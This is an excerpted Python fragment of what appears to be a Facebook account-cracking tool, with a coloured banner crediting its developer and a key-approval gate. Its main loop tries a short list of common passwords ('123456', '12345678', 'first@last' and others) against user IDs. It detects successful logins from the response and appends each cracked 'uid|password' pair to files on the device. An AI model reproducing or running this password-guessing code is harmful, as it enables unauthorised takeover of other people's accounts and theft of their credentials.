...
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92  SUSHIL
[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92m SUSHIL KUMAR YADAV
    ...
    try:
        ...
        for pw in ["57273200","123456789","1234567","12345678","123456","first@last"]:
            ...
            if "session_key" in rp:
                print(f"\r\r{G}SUSHIL🙈OK {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/SUSHIL-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}SUSHIL🙈OK {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/SUSHIL-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
...
def Subscraption():
	...
	if key1 in r1:
		...
		print(logo)
		print ("")
		print(" \033[1;32m SUSHIL Toll Free BUT You Need Get Approved First\033[1;37m\n")
